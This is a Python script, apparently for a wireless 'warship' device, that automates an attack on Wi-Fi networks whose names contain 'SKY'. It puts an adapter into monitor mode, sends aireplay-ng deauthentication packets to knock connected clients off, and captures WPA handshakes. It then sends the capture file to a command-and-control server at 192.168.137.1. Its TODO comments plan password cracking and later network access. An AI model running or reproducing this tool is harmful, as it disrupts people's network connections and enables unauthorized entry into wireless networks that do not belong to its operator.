import subprocess
import time
import os
import socket
import tqdm

host = "192.168.137.1"
port = 1234
SEPARATOR = "<SEPARATOR>"
BUFFER_SIZE = 4096
filename = "handshake-01.cap"
#TODO: atack mode read from starting args, assumed as 0
#TODO: Starting args; attack mode, retry lengths, passive scan length, interface
attackMode = 1
#0 is pasive, 1 is active

import AccessPoint,Station
def bToString(arg):
	return ''.join(map(chr,arg))

def sendRecieveHandshake():	
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
		s.connect((host,port))
		print("Connected to c2 server")
		filesize = os.path.getsize("handshake-01.cap")
		print("Sending file data")
		s.send(f"{filename}{SEPARATOR}{filesize}".encode())
		progress = tqdm.tqdm(range(filesize),f"Sending {filename}",unit="B",unit_scale=True,unit_divisor=1024)
		f = open(filename,"rb")
		while True:
			bytes_read = f.read(BUFFER_SIZE)
			if not bytes_read:
				break
			s.sendall(bytes_read)
			progress.update(len(bytes_read))
		f.close()
		data = s.recv(1024)
		print("Recieved: ",data)
		s.close()	
		exit()

#TODO: check if interface already contains mon, if so do not start interface
#TODO: Check actual interface name in monitor mode, not just a guestimate
#subprocess.check_output(['sudo', 'ifconfig','wlan0','down'])
wifiInterfaces = (bToString(subprocess.check_output(['sudo','airmon-ng'])))
wifiInterfaces = (wifiInterfaces.split("\n"))
for i in range (2,len(wifiInterfaces)):
    if(wifiInterfaces[i].__contains__("9271")):
       interface = wifiInterfaces[i].split("\t")
       interface = interface[1]
       break
print("Placing interface: " +interface+" into monitor mode")
#print(subprocess.run(['sudo', 'airmon-ng','check','kill']))
try:
	statusCheck = bToString(subprocess.check_output(['sudo', 'airmon-ng','start',interface]))
	if(statusCheck.__contains__("ERROR")):
		print("Error starting module, process terminating")
		exit(0)
except subprocess.CalledProcessError as e:
	print(e)
	print("Error starting module, process terminating")
	exit(0)
	
interface = interface +"mon"
print("Monitor mode started, interface now: "+ interface)
print("Starting access point scan")
subprocess.Popen(['sudo','timeout','10','airodump-ng','--ignore-negative-one','-w','dumpFile','--output-format','csv',interface],stdout=subprocess.DEVNULL)
time.sleep(10)
print("AP scan finished")
dumpFile = open("dumpFile-01.csv","r")
data = dumpFile.readlines()
dumpFile.close()
os.remove("dumpFile-01.csv")
accessPoints = []
for i in range(2,len(data)):
	if(data[i] != "" or data[i] != "\n"):
		splitData = data[i].split(',')
		if(len(splitData) > 1 and splitData[0] != 'Station MAC'):
			accessPoints.append(AccessPoint.AccessPoint(splitData))
		elif(splitData[0] == 'Station MAC'):
			break
print("Found",len(accessPoints),"access points")
for each in accessPoints:
	if(each.getSSID().__contains__("SKY")):
		target = each
		print("Searching for targets on "+ target.getSSID())
		if(attackMode == 0):
			#passive attack
			pass
		else:
			
			subprocess.Popen(['sudo','timeout','10','airodump-ng','--ignore-negative-one','--bssid', target.getMAC(), '-c', target.getChannel(),'-w','targetConnections','--output-format','csv',interface],stdout=subprocess.DEVNULL)
			time.sleep(10)
			targetConnection = open("targetConnections-01.csv","r")
			targetConnections = targetConnection.readlines()
			targetConnection.close()
			os.remove("targetConnections-01.csv")
			stations = (targetConnections[targetConnections.index("Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs\n")+1:-1])
			targetStations = []
			for each in stations:
				targetStations.append(Station.Station(each.split(',')))
			targetStations.sort(key=lambda x:x.getPackets(), reverse=True)
			print("Found",len(targetStations),"stations on the target network")
			for each in targetStations:
				print(each.getMAC())
			for targetedStation in targetStations:
				#attack stations sequentially until one gives a handshake
				#start with the most active 
				#sends 2 deauths per second
				#start monitor, end when the deauth 
				print("Starting deauth attack on "+target.getMAC()+" against station "+targetedStation.getMAC())
				subprocess.Popen(['sudo','timeout','10','airodump-ng','--bssid', target.getMAC(), '-c', target.getChannel(),'-w','handshake','--output-format','cap',interface],stdout=subprocess.DEVNULL)
				subprocess.Popen(['sudo','timeout','3','aireplay-ng','--deauth','1','-a',target.getMAC(),'-c',targetedStation.getMAC(),interface],stdout=subprocess.DEVNULL)
				time.sleep(10)
				print("Attack completed")
				keyCheck = subprocess.run(['tshark','-r','handshake-01.cap','-Y','eapol'],capture_output=True)
				keyCheck = bToString(keyCheck.stdout).split('\n')
				keys = [0,0,0,0]
				if len(keyCheck) > 3:
					for each in keyCheck:
						#match keys
						if sum(keys) == 4:
							break
						elif each.__contains__("Message 1"):
							keys[0] = 1
						elif each.__contains__("Message 2"):
							keys[1] = 1
						elif each.__contains__("Message 3"):
							keys[2] = 1
						elif each.__contains__("Message 4"):
							keys[3] = 1
					if(sum(keys) == 4):
						print("Full handshake captured")
						sendRecieveHandshake()
					else:
						print("Partial handshake captured")
						print(keys)
						os.remove("handshake-01.cap")
				else:
					print("Failed to capture full handshake")
					os.remove("handshake-01.cap")
				
				#TODO: exfiltrate data to other system for password cracking
				
				#TODO: Infiltrate cracked pass for network access
				
				



subprocess.check_output(['sudo','airmon-ng','stop',interface])
#subprocess.check_output(['sudo', 'ifconfig','wlan0','up'])
print("Warship Program Complete")

